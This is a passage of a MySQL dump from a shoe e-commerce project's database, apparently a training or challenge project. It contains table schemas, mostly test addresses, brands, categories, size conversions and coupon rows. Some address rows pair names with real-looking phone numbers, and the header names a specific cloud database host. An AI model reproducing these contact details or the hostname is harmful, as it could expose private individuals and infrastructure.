CREATE DATABASE  IF NOT EXISTS `ecommerce_shoes_3` /*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */ /*!80016 DEFAULT ENCRYPTION='N' */;
USE `ecommerce_shoes_3`;
-- MySQL dump 10.13  Distrib 8.0.17, for Win64 (x86_64)
--
-- Host: skychallenge.cvzu4xrxvkdz.eu-south-1.rds.amazonaws.com    Database: ecommerce_shoes_3
-- ------------------------------------------------------
-- Server version	8.0.35

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
SET @MYSQLDUMP_TEMP_LOG_BIN = @@SESSION.SQL_LOG_BIN;
SET @@SESSION.SQL_LOG_BIN= 0;

--
-- GTID state at the beginning of the backup 
--

SET @@GLOBAL.GTID_PURGED=/*!80000 '+'*/ '';

--
-- Table structure for table `addresses`
--

DROP TABLE IF EXISTS `addresses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `addresses` (
  `id` int NOT NULL AUTO_INCREMENT,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `disabled_at` datetime DEFAULT NULL,
  `label` varchar(100) DEFAULT NULL,
  `name_surname` varchar(100) NOT NULL,
  `country` varchar(100) NOT NULL,
  `street_address` varchar(100) NOT NULL,
  `telephone` varchar(100) NOT NULL,
  `zipcode` varchar(5) NOT NULL,
  `instructions` text,
  `user_id` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `addresses_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=137 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `addresses`
--

LOCK TABLES `addresses` WRITE;
/*!40000 ALTER TABLE `addresses` DISABLE KEYS */;
INSERT INTO `addresses` VALUES (1,'2023-03-07 16:36:28',NULL,'Prova','Marianna Nido','Italia','Via Proviamo Indirizzo, 2','9658742','98562','Indirizzo di prova',1),(3,'2023-03-07 17:43:00',NULL,'Prova edit address','Edit ancora',' Italia','Via Vai 3','3242343','06135','Suona tre volte',1),(6,'2023-03-07 17:08:32','2023-03-09 09:25:22','Prova 2','Nipote mia','Italia','Helo','0987654','3456','Prova prova',1),(8,'2023-03-08 09:16:22',NULL,'Casa','gianfranco','Italia','Via via','33333','11010','',7),(10,'2023-03-10 01:07:19',NULL,'Indirizzo Casa','Michela Rossi','Italia','Via Lavori, 5','3299444758','06345','',5),(11,'2023-03-10 01:07:37',NULL,'Ufficio','Pietro','Italia','via della tigre,5','3488555948','34343','consegna con cura grazie :)',5),(12,'2023-03-10 16:01:43',NULL,'Ufficio','Maria Gialli','Italia','via della tigre, 1','24323423','34543','consegna con cura grazie :)',13),(25,'2023-03-17 13:52:55','2023-04-02 14:46:10','via','user uno','ita','manzoni, 24','33364856','70035','lascia giu',15),(26,'2023-03-17 14:07:38','2023-04-02 14:51:02','via','user uno','ita','dante, 32','33364856','70035','lascia su',15),(27,'2023-03-17 14:34:42','2023-04-02 14:51:09','via','user uno','ita','dante, 32','33364856','70035','lascia su',15),(29,'2023-03-20 11:03:44','2023-03-20 11:14:18','Ufficio7','user uno','ita','pippo, 32','33364856','70035','lascia su',14),(30,'2023-03-20 11:03:51','2023-03-20 12:48:05','Ufficio7','user uno','ita','pippo, 32','33364856','70035','lascia su',14),(31,'2023-03-20 11:15:45','2023-03-20 11:14:18','Ufficio7','user uno','ita','pippo, 32','33364856','70035','lascia su',14),(32,'2023-03-20 11:16:21','2023-03-20 11:14:18','Ufficio7','user uno','ita','pippo, 32','33364856','70035','lascia su',14),(33,'2023-03-20 11:46:43',NULL,'Ufficiado7','user uno','ita','pippo, 32','33364856','70035','lascia su',14),(34,'2023-03-20 11:48:36',NULL,'Ufficio2','user uno','ita','pippo, 32','33364856','70035','lascia su',14),(35,'2023-03-20 14:07:53',NULL,'Ufficio2','user uno','ita','pippo, 32','33364856','70035','lascia su',14),(36,'2023-03-20 14:07:54','2023-03-20 15:08:05','Ufficio2','user uno','ita','pippo, 32','33364856','70035','lascia su',14),(37,'2023-03-30 12:47:28',NULL,'string','luigi rossi','italy','via test','00000','13100','nothing',73),(38,'2023-03-30 12:53:34',NULL,'string','luigi rossi','italy','via test','00000','13100','nothing',73),(39,'2023-03-30 12:53:54',NULL,'string','luigi rossi','italy','via test','00000','13100','nothing',73),(40,'2023-03-30 12:55:51','2023-03-30 12:53:14','string','luigi rossi','italy','via test','00000','13100','nothing',75),(41,'2023-03-30 12:56:34','2023-03-30 12:53:14','string','luigi rossi','italy','via test','00000','13100','nothing',75),(42,'2023-03-30 12:56:36','2023-03-30 12:53:14','string','luigi rossi','italy','via test','00000','13100','nothing',75),(43,'2023-03-30 12:56:54','2023-03-30 12:53:14','string','luigi rossi','italy','via test','00000','13100','nothing',75),(44,'2023-03-30 12:57:02','2023-03-30 12:53:14','string','luigi rossi','italy','via test','00000','13100',NULL,75),(45,'2023-03-30 12:57:09','2023-03-30 12:53:14',NULL,'luigi rossi','italy','via test','00000','13100',NULL,75),(46,'2023-03-30 12:57:10','2023-03-30 12:53:14',NULL,'luigi rossi','italy','via test','00000','13100',NULL,75),(47,'2023-03-30 13:01:32','2023-03-30 12:53:14',NULL,'luigi rossi','italy','via prova','00000','13100',NULL,75),(48,'2023-03-30 13:02:03','2023-03-30 12:53:14',NULL,'luigi rossi','italy','via prova 3','00000','13100',NULL,75),(49,'2023-03-30 15:16:42','2023-03-30 13:16:55',NULL,'luigi rossi','italy','Via Montebello','00000','13100',NULL,75),(50,'2023-03-30 15:17:49','2023-03-30 13:18:08',NULL,'luigi rossi','italy','vai PROVA','00000','13100',NULL,75),(51,'2023-03-30 15:21:08','2023-03-30 13:21:27',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(52,'2023-03-30 15:24:59','2023-03-30 13:27:17',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(53,'2023-03-30 15:34:16','2023-03-30 13:34:22',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(54,'2023-03-30 15:36:53','2023-03-30 13:37:09',NULL,'luigi rossi','italy','via numero 14','00000','13100',NULL,75),(55,'2023-03-30 15:40:10','2023-03-30 14:52:59',NULL,'luigi rossi','italy','via test 15','00000','13100',NULL,75),(56,'2023-03-30 15:46:59','2023-03-30 14:53:05',NULL,'luigi rossi','italy','','00000','13100',NULL,75),(57,'2023-03-30 15:48:18','2023-03-30 14:53:08',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(58,'2023-03-30 15:49:16','2023-03-30 14:53:11',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(59,'2023-03-30 15:50:04','2023-03-30 14:53:13',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(60,'2023-03-30 15:50:40','2023-03-30 14:53:16',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(61,'2023-03-30 15:50:49','2023-03-30 14:53:18',NULL,'luigi rossi','italy','via test 15','00000','13100',NULL,75),(62,'2023-03-30 15:54:53','2023-03-30 14:53:20',NULL,'luigi rossi','italy','aaaa','00000','13100',NULL,75),(63,'2023-03-30 15:55:42',NULL,'Ufficio2','user uno','ita','pippo, 32','33364856','70035','lascia su',77),(64,'2023-03-30 15:56:48','2023-03-30 14:53:22',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(65,'2023-03-30 15:58:13','2023-03-30 14:57:19',NULL,'luigi rossi','italy','Via Test','00000','13100',NULL,75),(66,'2023-03-30 15:59:23','2023-03-30 14:53:36',NULL,'luigi rossi','italy','via prova','00000','13100',NULL,75),(67,'2023-03-30 15:59:44','2023-03-30 14:53:34',NULL,'luigi rossi','italy','via prova2','00000','13100',NULL,75),(68,'2023-03-30 16:00:02','2023-03-30 14:01:43',NULL,'luigi rossi','italy','via prova2','00000','13100',NULL,75),(69,'2023-03-30 16:00:10','2023-03-30 14:01:22',NULL,'luigi rossi','italy','via prova1','00000','13100',NULL,75),(70,'2023-03-30 16:03:35','2023-03-30 14:53:33',NULL,'luigi rossi','italy','yyyy','00000','13100',NULL,75),(71,'2023-03-30 16:05:30','2023-03-30 14:53:31',NULL,'luigi rossi','italy','sssss','00000','13100',NULL,75),(72,'2023-03-30 16:06:26','2023-03-30 14:53:30',NULL,'luigi rossi','italy','qqqqq','00000','13100',NULL,75),(73,'2023-03-30 16:06:54','2023-03-30 14:07:37',NULL,'luigi rossi','italy','asasasas','00000','13100',NULL,75),(74,'2023-03-30 16:27:23','2023-03-30 14:28:16',NULL,'mario rossi','Italy','Via Test','44444','13400',NULL,75),(75,'2023-03-30 16:53:58','2023-03-30 14:54:08',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(76,'2023-03-30 16:58:36','2023-03-30 14:59:07',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(77,'2023-03-30 16:58:40','2023-03-30 14:58:55',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(78,'2023-03-30 16:59:18','2023-03-30 15:03:10',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(79,'2023-03-30 17:00:52','2023-03-30 15:01:16',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(80,'2023-03-30 17:02:41','2023-03-30 15:03:12',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(81,'2023-03-30 17:02:59','2023-03-30 15:03:21',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(82,'2023-03-30 17:05:33','2023-03-30 15:08:06',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(83,'2023-03-30 17:08:17','2023-03-30 15:17:56',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(84,'2023-03-30 17:12:57','2023-03-30 15:15:43',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(85,'2023-03-30 17:14:33','2023-03-30 15:15:39',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(86,'2023-03-30 17:14:47','2023-03-30 15:15:37',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(87,'2023-03-30 17:17:37','2023-03-30 15:17:55',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(88,'2023-03-30 17:18:21','2023-03-30 15:20:16',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(89,'2023-03-30 17:18:50','2023-03-30 15:19:35',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(90,'2023-03-30 17:19:44','2023-03-30 15:20:14',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(91,'2023-03-30 17:20:25','2023-03-30 15:20:52',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(92,'2023-03-30 17:20:47','2023-03-30 15:20:51',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(93,'2023-03-30 17:35:29','2023-04-02 08:28:07',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(94,'2023-03-30 17:35:31','2023-03-30 15:35:35',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(95,'2023-03-30 20:50:09','2023-04-02 08:28:02',NULL,'mario rossi','Italy','Via Test','3469650736','13400',NULL,75),(96,'2023-04-02 12:30:07','2023-04-03 13:48:14',NULL,'mario rossi','Italy','Via Test','44444','13400',NULL,75),(97,'2023-04-02 15:21:41',NULL,'Ufficio','Paolo Di Martino','Italia','via Piazza Matteotti, 11','3334445676','80045','Lasciare il pacco in portineria',15),(98,'2023-04-02 15:28:55',NULL,'Casa','Alfonso Di Martino','Italia','viale Europa, 15','3335467651','80097','Bussare al citofono',15),(99,'2023-04-02 17:03:15',NULL,'Seconda casa','Mario Rossi','Italia','Piazza della Libertà','3317573981','98754','Lasciare all\'ingresso',15),(100,'2023-04-02 18:52:07',NULL,'Casa','Paolo Di Martino','Italia','via dei Martiri, 14','0818723737','80053','Bussare al citofono',88),(101,'2023-04-02 18:53:30','2023-04-03 07:11:27','Ufficio','Paolo Di Martino','Italia','via Piazza Umberto, 2','3337673123','87623','Lasciare al portiere del palazzo',88),(102,'2023-04-03 15:17:48','2023-04-03 13:48:13',NULL,'Francesco Scialdone','Italia','Via Rossi 14','3331122333','80239',NULL,61),(103,'2023-04-03 15:47:30','2023-04-03 13:48:13',NULL,'mario rossi','Italy','Via Test','44444','13400',NULL,75),(104,'2023-04-03 15:47:37','2023-04-03 13:48:11',NULL,'mario rossi','Italy','via test 15','44444','13400',NULL,75),(105,'2023-04-03 15:48:00','2023-04-03 13:48:09',NULL,'mario rossi','Italy','via test 20','44444','13400',NULL,75),(106,'2023-04-03 15:48:19',NULL,NULL,'mario rossi','Italy','via test 20','44444','13400',NULL,75),(107,'2023-04-03 15:48:26',NULL,NULL,'mario rossi','Italy','via test','44444','13400',NULL,75),(108,'2023-04-03 15:48:45',NULL,NULL,'Mario Rossi','Italia','Via Roma','3331212123','81123',NULL,61),(109,'2023-04-03 15:49:06',NULL,NULL,'Francesco Scialdone','Italia','Via Roma','3331212123','81142',NULL,61),(110,'2023-04-03 17:50:08',NULL,NULL,'Giuseppe Rossi','Italia','Via Leopardi 14','3331122333','80209',NULL,61),(111,'2023-04-03 22:05:43','2023-04-03 20:09:10','Ufficio','Alfonso Di Martino','Italia','via Piazza Matteotti, 11','3334567891','80097','Lasciare in portineria',88),(112,'2023-04-03 22:09:38','2023-04-03 20:10:10','Ufficio','Alfonso Di Martino','Italia','via Piazza Matteotti, 11','3334567892','80041','Lasciare al portiere',88),(113,'2023-04-03 22:11:05',NULL,'Ufficio','Alfonso Di Martino','Italia','via Largo Fusco, 3','3213332134','87632','Lasciare in portineria',88),(114,'2023-04-04 09:01:43','2023-04-04 09:25:57','Casa vacanze','Anna Esposito','Italia','via Principe Umberto, 14','3337678923','89054','Lasciare dietro al cancello',88),(115,'2023-04-04 14:41:12',NULL,NULL,'Giuseppe Rossi','Italia','Via Roma','3333333333','81109',NULL,80),(116,'2023-04-04 15:00:57',NULL,NULL,'Giuseppe Rossi','Italia','Via Roma','3331212123','21122',NULL,85),(117,'2023-04-04 15:20:57',NULL,NULL,'Giuseppe Rossi','Italia','Via Roma','3331212123','21122',NULL,81),(118,'2023-04-04 15:38:20',NULL,NULL,'Giuseppe Rossi','Italia','Via Roma','3331212123','21122',NULL,82),(119,'2023-04-04 18:55:26',NULL,NULL,'Giuseppe Rossi','Via Roma','Via Roma','3331212123','22222',NULL,98),(120,'2023-04-04 19:50:23',NULL,'Casa','Alfredo Giacomelli','Italia','via Vico Perduto, 1','3453393214','80053','Lasciare all\'ingresso',96),(121,'2023-04-05 15:33:21','2023-04-05 14:04:06','Seconda casa','Mario Rossi','Italia','Piazza della Libertà','333777888999','32323','Lasciare il pacco in portineria',88),(122,'2023-04-05 18:01:56','2023-04-06 08:42:25',NULL,'fabrizio ettori','italia','Via del Cilianuzzo 584545','3892518898','59100',NULL,43),(123,'2023-04-05 22:50:54',NULL,'Casa','Mario Rossi','Francia','Via dei Ginepri 40','3334445566','12343','Lasciare sulla porta',101),(124,'2023-04-05 22:51:29',NULL,'Ufficio','Mario Rossi','Inghilterra','Via del Business 66','3334445566','66666','Consegnare in ufficio',101),(125,'2023-04-06 00:12:33','2023-04-06 08:42:28',NULL,'Fabrizio Ettori','America','Via Luca Rossi, 57','3336990097','59100',NULL,43),(126,'2023-04-06 08:55:47',NULL,'Casa vacanze','Giuseppe Di Martino','Italia','via Vico Perduto, 4','3337473876','80045','Lasciare all\'ingresso',88),(127,'2023-04-06 10:06:06',NULL,NULL,'michele angioni','Italia','Via rossi 25','3336990097','59100',NULL,104),(128,'2023-04-06 10:07:19',NULL,NULL,'michele angioni','Italia','Via rossi 25','3336990097','59100',NULL,104),(129,'2023-04-06 10:07:59',NULL,NULL,'michele angioni','Italia','Via rossi 25','3336990097','59100',NULL,104),(130,'2023-04-06 10:08:03',NULL,NULL,'michele angioni','Italia','Via rossi 25','3336990097','59100',NULL,104),(131,'2023-04-06 10:42:45',NULL,NULL,'Fabrizio Ettori','Italia','Via Roma 53','3336990097','59100',NULL,43),(132,'2023-04-06 10:43:35','2023-04-06 09:53:08',NULL,'Fabrizio Ettori','Inghilterra','Via Carlo Carli 13','3336990097','59100',NULL,43),(135,'2023-04-26 11:47:42',NULL,'Via','Carlo rossi','Italia','Via ugo la malfa','340411986','70036','Lascia giu',103),(136,'2023-04-26 12:06:13',NULL,'Via','Carlo rossi','Italia','Via ugo la malfa','340411986','70036','Lascia giu',103);
/*!40000 ALTER TABLE `addresses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `authority`
--

DROP TABLE IF EXISTS `authority`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `authority` (
  `id` int NOT NULL,
  `authority` varchar(45) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `authority_UNIQUE` (`authority`),
  UNIQUE KEY `id_UNIQUE` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `authority`
--

LOCK TABLES `authority` WRITE;
/*!40000 ALTER TABLE `authority` DISABLE KEYS */;
INSERT INTO `authority` VALUES (2,'ADMIN'),(4,'DATA_ENTRY'),(3,'MARKETING'),(1,'USER');
/*!40000 ALTER TABLE `authority` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `brands`
--

DROP TABLE IF EXISTS `brands`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `brands` (
  `code` varchar(100) NOT NULL,
  `brand` varchar(100) NOT NULL,
  PRIMARY KEY (`code`),
  UNIQUE KEY `brand_UNIQUE` (`code`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `brands`
--

LOCK TABLES `brands` WRITE;
/*!40000 ALTER TABLE `brands` DISABLE KEYS */;
INSERT INTO `brands` VALUES ('Adidas','Adidas'),('Asics','Asics'),('Bear','Bear'),('BelleScarpe','BellaScarpa'),('BR1','Hermes'),('Converse','Converse'),('Fila','Fila'),('Globe','Globe'),('Hoka','Hoka'),('New Balance','New Balance'),('Nike','Nike'),('Puma','Puma'),('Reebok','Reebok'),('Saucony','Saucony'),('TEST_EXPRESS','test_express'),('TEST_EXPRESS1','test_express'),('TEST_EXPRESS2','test_express'),('TEST_EXPRESS3','test_express'),('TEST_EXPRESS45','test_express45'),('Under Armour','Under Armour'),('Vans','Vans');
/*!40000 ALTER TABLE `brands` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `categories`
--

DROP TABLE IF EXISTS `categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `categories` (
  `code` varchar(100) NOT NULL,
  `category_it` varchar(100) NOT NULL,
  `category_eng` varchar(100) NOT NULL,
  PRIMARY KEY (`code`),
  UNIQUE KEY `category_it_UNIQUE` (`code`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `categories`
--

LOCK TABLES `categories` WRITE;
/*!40000 ALTER TABLE `categories` DISABLE KEYS */;
INSERT INTO `categories` VALUES ('Calcio','Calcio','Football'),('Camminata','Camminata','Walking'),('Corsa','Corsa','Running'),('Cross training','Cross training','Cross training'),('Fitness','Fitness','Fitness'),('Pallacanestro','Pallacanestro','Basketball'),('Skate','Skate','Skate'),('Sneakers','Sneakers','Sneakers'),('Trail running','Trail running','Trail running');
/*!40000 ALTER TABLE `categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `colors`
--

DROP TABLE IF EXISTS `colors`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `colors` (
  `code` varchar(100) NOT NULL,
  `color_it` varchar(100) NOT NULL,
  `color_eng` varchar(100) NOT NULL,
  PRIMARY KEY (`code`),
  UNIQUE KEY `color_it_UNIQUE` (`code`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `colors`
--

LOCK TABLES `colors` WRITE;
/*!40000 ALTER TABLE `colors` DISABLE KEYS */;
INSERT INTO `colors` VALUES ('Bianco','Bianco','White'),('Blu','Blu','Blue'),('Grigio','Grigio','Grey'),('Lilla','Lilla','Lilac'),('Multicolor','Multicolor','Multicolor'),('Nero','Nero','Black'),('Rosa','Rosa','Pink'),('Rosso','Rosso','Red'),('Verde','Verde','Green');
/*!40000 ALTER TABLE `colors` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `conversion_sizes`
--

DROP TABLE IF EXISTS `conversion_sizes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `conversion_sizes` (
  `eu` varchar(100) NOT NULL,
  `usa` varchar(100) DEFAULT NULL,
  `uk` varchar(100) DEFAULT NULL,
  `cm` varchar(100) DEFAULT NULL,
  PRIMARY KEY (`eu`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `conversion_sizes`
--

LOCK TABLES `conversion_sizes` WRITE;
/*!40000 ALTER TABLE `conversion_sizes` DISABLE KEYS */;
INSERT INTO `conversion_sizes` VALUES ('M36','M4','M3','M21'),('M40','M6','M9','M48'),('M41','M7.5','M7','M25.5'),('M42','M8.5','M8','M26.5'),('M43','M9','M8.5','M27'),('W35','W4.5','W2.5','W21.5'),('W36','W5.5','W3.5','W22.5'),('W37','W6','W4','W23'),('W38','W7','W5','W24');
/*!40000 ALTER TABLE `conversion_sizes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `coupons`
--

DROP TABLE IF EXISTS `coupons`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `coupons` (
  `id` int NOT NULL AUTO_INCREMENT,
  `code` varchar(100) NOT NULL,
  `max_usages` int NOT NULL,
  `user_id` int DEFAULT NULL,
  `expire_date` datetime DEFAULT NULL,
  `type` varchar(100) NOT NULL,
  `value` double NOT NULL,
  `min_order` double DEFAULT NULL,
  `description_it` varchar(255) DEFAULT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `disabled_at` datetime DEFAULT NULL,
  `description_eng` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  CONSTRAINT `coupons_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=50 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `coupons`
--

LOCK TABLES `coupons` WRITE;
/*!40000 ALTER TABLE `coupons` DISABLE KEYS */;
INSERT INTO `coupons` VALUES (2,'WELCOME1',1,NULL,NULL,'percentuale',3,NULL,'promozione di benvenuto','2023-03-23 10:48:18','2023-03-31 10:14:33','welcome promo'),(4,'SPRING23',1,1,NULL,'assoluto',8,25,'promozione di primavera','2023-03-23 10:48:18','2023-04-04 14:32:25','spring promo'),(5,'HELLOSPRING',1,1,NULL,'assoluto',12,NULL,'promozione di primavera','2023-03-23 10:48:18','2023-04-03 11:31:47','spring promo'),(6,'EndSpring',3,NULL,NULL,'assoluto',300,NULL,'promozione di primavera','2023-03-23 10:48:18',NULL,'spring promo'),(8,'HELLO10',3,NULL,'2023-03-23 12:21:32','assoluto',300,NULL,'promozione di primavera','2023-03-23 11:57:08',NULL,'spring promo'),(11,'Hello',3,NULL,NULL,'assoluto',300,NULL,'promozione di primavera','2023-03-28 08:09:46','2023-04-03 20:00:53','spring promo'),(12,'Spring',3,NULL,NULL,'assoluto',300,NULL,'promozione di primavera','2023-03-28 08:10:05','2023-04-04 14:34:28','spring promo'),(13,'CIAOPRIMAVERA23!',3,NULL,'2023-03-28 12:44:25','assoluto',300,NULL,'promozione di primavera','2023-03-28 09:45:22','2023-03-30 17:48:19','spring promo'),(14,'CIAOPRIMAVERA23!',3,NULL,'2023-03-30 18:46:47','assoluto',300,NULL,'promozione di primavera','2023-03-28 10:43:19','2023-03-31 12:58:33','spring promo'),(16,'APRIL2023',3,NULL,'2000-01-01 23:59:59','assoluto',20,NULL,'ciao','2023-03-30 17:23:55','2023-04-04 15:15:52','hello'),(17,'TESTBO03',2,NULL,'2023-03-31 23:59:59','percentuale',19,NULL,'testando aggiunta coupon','2023-03-30 17:32:13','2023-03-31 12:51:37','testing add coupon'),(18,'CiaoCiao',3,NULL,'2023-03-30 17:42:59','stringa',300,NULL,'promozione di primavera','2023-03-30 17:32:26',NULL,'stringa'),(19,'Edit2Test',2,NULL,'2024-04-12 23:59:59','percentuale',15,80,'Sconto 15% su ordine minimo 80€','2023-03-30 17:37:28','2023-04-03 19:45:26','15% discount on minimum order 80€'),(21,'SPECIAL20',3,NULL,'2023-04-01 23:59:59','percentuale',20,NULL,'sconto 20%','2023-03-30 19:20:33','2023-03-31 12:49:26','discount 20%'),(22,'EDITTEST',3,NULL,'2024-01-01 23:59:59','string',10,5,'promozione di primavera','2023-03-31 09:56:24','2023-04-03 19:55:38','spring promo'),(23,'EndOfMarchPromo',1,NULL,'1982-02-01 23:59:59','Absolute',30,150,'','2023-03-31 10:00:20',NULL,''),(24,'EndOfMarchPromo2',2,NULL,'2023-04-02 23:59:59','percentage',50,150,'lorem','2023-03-31 10:14:55','2023-03-31 12:50:26','ipsum'),(25,'Test31MarchCoupon',1,NULL,'2023-04-01 23:59:59','percentage',20,50,'lorem','2023-03-31 10:19:01','2023-03-31 12:59:30','ipsum'),(26,'APRIL23',2,NULL,'2023-04-01 23:59:59','percentage',35,199,'35% discount','2023-04-01 11:40:58',NULL,'sconto 35%'),(27,'3APRILE23',3,NULL,'2023-04-05 23:59:59','Percentage',20,50,'sconto 20%','2023-04-03 11:40:49',NULL,'discount 20%'),(29,'ciao',3,NULL,'2024-03-02 23:59:59','stringa',300,200,'stringa','2023-04-03 16:48:42','2023-05-15 08:18:05','stringa'),(32,'DISCOUNTMANIA',3,NULL,'2024-03-02 23:59:59','Percentage',15,100,'Sconto 15%','2023-04-03 16:58:59','2023-04-06 10:11:37','Discount 15%'),(33,'Ok10',3,NULL,'2024-03-02 23:59:59','stringa',300,200,'stringa','2023-04-03 17:01:45','2023-04-03 19:52:12','stringa'),(34,'20SPECIAL',1,NULL,'2023-04-13 23:59:59','Percentage',20,100,'20% discount','2023-04-03 21:42:12',NULL,'20% sconto'),(35,'30SPECIALX',3,NULL,'2023-05-04 23:59:59','Absolute',30,99,'Sconto','2023-04-03 21:44:09','2023-04-04 14:46:27','Discount'),(36,'APRIL232',2,NULL,'2023-04-21 23:59:59','22',2,19,'ad','2023-04-03 21:44:53','2023-04-03 19:59:43','ad'),(37,'COUPONMAGIC5',2,NULL,'2023-04-12 23:59:59','Asolute',5,15,'5% sconto','2023-04-03 21:46:48',NULL,'5% discount'),(38,'TESTTOAST',2,NULL,'2222-02-02 23:59:59','w',2,2,'','2023-04-03 21:47:48','2023-04-03 19:57:12',''),(39,'TestPUTMarchCoupon',2,NULL,'2023-04-06 23:59:59','Percentage',2,87,'','2023-04-03 21:49:14','2023-04-06 06:57:21',''),(40,'SPRINGFEVER2',5,NULL,'2023-04-19 23:59:59','Percentage',25,99,'25% sconto','2023-04-03 22:01:38','2023-04-06 06:57:47','25% discount'),(41,'4APRILE23',3,NULL,'2023-04-07 23:59:59','Percentage',20,100,'20% discount','2023-04-04 09:45:53','2023-04-06 07:22:03','20% sconto'),(42,'SPRINGMAXI',2,NULL,'2023-04-12 23:59:59','Percentage',15,50,'15% sconto','2023-04-04 09:51:03','2023-04-04 17:01:30','15% discount'),(43,'APRIL4TH',3,NULL,'2023-04-05 23:59:59','Percentage',10,30,'Sconto 10','2023-04-04 09:55:59',NULL,'Discount 10'),(44,'APRIL5',3,NULL,'2023-04-12 23:59:59','Percentage',20,40,'sconto 20%','2023-04-05 14:05:22',NULL,'discount 20%'),(45,'FRA15',3,NULL,'2023-04-10 23:59:59','percentage',15,45,'sconto 15%','2023-04-05 